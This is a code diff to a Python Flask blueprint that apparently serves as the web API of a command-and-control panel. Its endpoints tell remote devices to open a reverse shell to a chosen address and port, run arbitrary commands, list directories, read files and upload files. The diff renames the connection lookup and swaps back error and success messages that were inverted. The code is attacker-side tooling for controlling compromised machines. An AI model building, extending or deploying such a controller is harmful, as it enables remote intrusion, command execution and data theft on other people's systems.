@@ -10,18 +10,18 @@ def devices_enpoints(Handler):
         address = request.form.get("address")
         port = request.form.get("port")
         try:
-            conn = Handler.get_conn(id).revshell(address, port)
+            conn = Handler.get_device(id).revshell(address, port)
         except Exception as e:
-            return jsonify({"status": "success", "message": "Reverse Shell Opened"})
-        else:
             return jsonify({"status": "error", "message": "Couldn't open a Reverse Shell"})
+        else:
+            return jsonify({"status": "success", "message": "Reverse Shell Opened"})
 
     @devices.route("/rce", methods=["POST"])
     def rce():
         id = request.form.get("id")
         cmd = request.form.get("cmd")
         try:
-            output = Handler.get_conn(id).rce(cmd)
+            output = Handler.get_device(id).rce(cmd)
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
@@ -30,8 +30,9 @@ def devices_enpoints(Handler):
     @devices.route("/infos", methods=["GET"])
     def infos():
         id = request.args.get("id")
+        output = Handler.get_device(id).infos()
         try:
-            output = Handler.get_conn(id).get_device_infos()
+            output = Handler.get_device(id).infos()
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
@@ -42,7 +43,7 @@ def devices_enpoints(Handler):
         id = request.args.get("id")
         dir = request.args.get("dir")
         try:
-            output = Handler.get_conn(id).get_directory_contents(dir)
+            output = Handler.get_device(id).get_directory_contents(dir)
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
@@ -53,7 +54,7 @@ def devices_enpoints(Handler):
         id = request.args.get("id")
         path = request.args.get("path")
         try:
-            output = Handler.get_conn(id).get_file_contents(id, path)
+            output = Handler.get_device(id).get_file_contents(path)
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
@@ -65,7 +66,7 @@ def devices_enpoints(Handler):
         fil = request.form.get("fil")
         path = request.form.get("path")
         try:
-            output = Handler.get_conn(id).file_upload(fil)
+            output = Handler.get_device(id).file_upload(fil)
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
